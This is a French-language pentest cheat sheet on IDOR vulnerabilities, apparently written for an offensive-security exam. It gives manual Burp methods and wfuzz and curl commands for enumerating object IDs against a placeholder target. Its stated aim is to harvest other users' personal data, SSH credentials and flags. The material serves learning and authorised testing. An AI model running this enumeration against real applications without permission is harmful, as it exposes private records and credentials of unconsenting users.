# IDOR — Insecure Direct Object Reference

## 1. Concept

L'IDOR se produit quand une app expose une référence directe à un objet interne (fichier, enregistrement BDD, ressource) **sans vérifier que l'utilisateur est autorisé à y accéder**. Il suffit de modifier l'identifiant pour accéder aux données d'un autre utilisateur.

⚠️ Les scanners automatiques ne détectent pas toujours l'IDOR — c'est une vulnérabilité à chercher **manuellement**.

---

## 2. Formes d'IDOR

### 2.1 Fichier statique

```
/docs/?f=1.txt        → modifier → /docs/?f=2.txt
/files/invoice_42.pdf → modifier → /files/invoice_43.pdf
```

### 2.2 ID numérique en base de données

```
/customerPage/?custId=1   → incrémenter → custId=2, 3, 4...
/user/?uid=62718
/api/messages/11          → modifier → /api/messages/9, 10, 12...
```

### 2.3 ID dans le path (routing)

```
/users/18293017/documents/file-15
/trains/LVIV-ODESSA
/orders/2024-00042/invoice
```

### 2.4 ID encodé

```
/challenge/?uid=MQ==    → décoder base64 → "1" → tester 2, 3...
```

Décoder/encoder base64 :
```bash
echo "MQ==" | base64 -d    # → 1
echo -n "2" | base64        # → Mg==
echo -n "3" | base64        # → Mw==
```

### 2.5 UUID / identifiants complexes

```
/userProfile/a8e62d80-42cc-4ac6-bf53-d28a0ff61a82
```
→ Semblent sécurisés mais si prévisibles ou énumérables → toujours tester.

---

## 3. Méthodologie manuelle

### 3.1 Identifier les références

Dans Burp — chercher dans toutes les requêtes :

- Paramètres avec `id`, `uid`, `custId`, `noteId`, `file`, `user`, `ref`...
- IDs dans le path de l'URL
- IDs dans le body des requêtes POST

### 3.2 Tester manuellement

```
1. Noter l'ID actuel
2. Incrémenter / décrémenter (+1, -1)
3. Tester des valeurs basses (1, 2, 3...)
4. Comparer la taille et le contenu des réponses
```

---

## 4. Fuzzing automatisé (wfuzz)

### 4.1 Obtenir la taille de réponse "vide" (baseline)

```bash
# Requête authentifiée avec un ID aléatoire qui n'existe pas
curl -s http://TARGET/user/?uid=99999 \
  -w '%{size_download}' \
  --header "Cookie: PHPSESSID=TON_COOKIE"
# → noter la taille retournée ex: 2873
```

### 4.2 Lancer wfuzz

```bash
# IDs numériques 5 chiffres
wfuzz -c \
  -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt \
  --hc 404 \
  --hh TAILLE_BASELINE \
  -H "Cookie: PHPSESSID=TON_COOKIE" \
  "http://TARGET/user/?uid=FUZZ"
```

```bash
# IDs numériques simples (1 à 1000)
wfuzz -c \
  -z range,1-1000 \
  --hc 404 \
  --hh TAILLE_BASELINE \
  -H "Cookie: PHPSESSID=TON_COOKIE" \
  "http://TARGET/api/notes/FUZZ"
```

**Options clés :**

- `--hh X` : exclure les réponses de taille X (réponse "vide" / erreur)
- `--hc 404` : exclure les 404
- `-H` : injecter un header (cookie de session obligatoire si auth requise)

### 4.3 Récupérer le cookie de session

Dans Burp → intercepter le login → copier la valeur du cookie de session dans les headers.

---

## 5. IDOR dans les requêtes POST

L'IDOR n'est pas limité aux paramètres GET — vérifier aussi le body des POST :

```bash
# Requête originale
POST /api/messages/print
noteId=11

# Tester dans Burp Repeater
noteId=9
noteId=10
noteId=12
noteId=1
```

Dans Burp → **Send to Repeater** → modifier le paramètre et rejouer.

---

## 6. Ce qu'on cherche une fois l'IDOR confirmé

```
- Données personnelles d'autres users (emails, noms, adresses)
- Credentials (mots de passe, clés API, tokens SSH)
- Messages privés entre utilisateurs
- Fichiers sensibles (factures, documents médicaux)
- Flags local.txt / proof.txt
- Accès admin via ID bas (1, 2, admin...)
```

**Exemple (OpenEMR) :**
```
/pnotes_print.php?noteid=9  → credentials SSH dans le message
/pnotes_print.php?noteid=12 → flag OS{...}
```

---

## 7. Workflow exam

```
1. Explorer l'app avec Burp — noter tous les paramètres avec IDs
2. Pour chaque paramètre suspect :
   a. Tester manuellement ±1, valeurs basses (1, 2, 3...)
   b. Si encodé (base64...) → décoder, modifier, ré-encoder
3. Si ID numérique sur large plage → fuzzer avec wfuzz
   a. Obtenir baseline curl (taille réponse vide)
   b. Lancer wfuzz avec --hh pour filtrer
   c. Examiner les résultats dans Burp
4. Ne pas oublier les POST → tester dans Burp Repeater
5. Documenter toutes les données sensibles exfiltrées
```

!!! tip "Chercher dans les données exfiltrées"
    Ne pas s'arrêter au premier ID trouvé — parcourir tous les résultats wfuzz,  
    un des enregistrements peut contenir des credentials SSH ou un flag.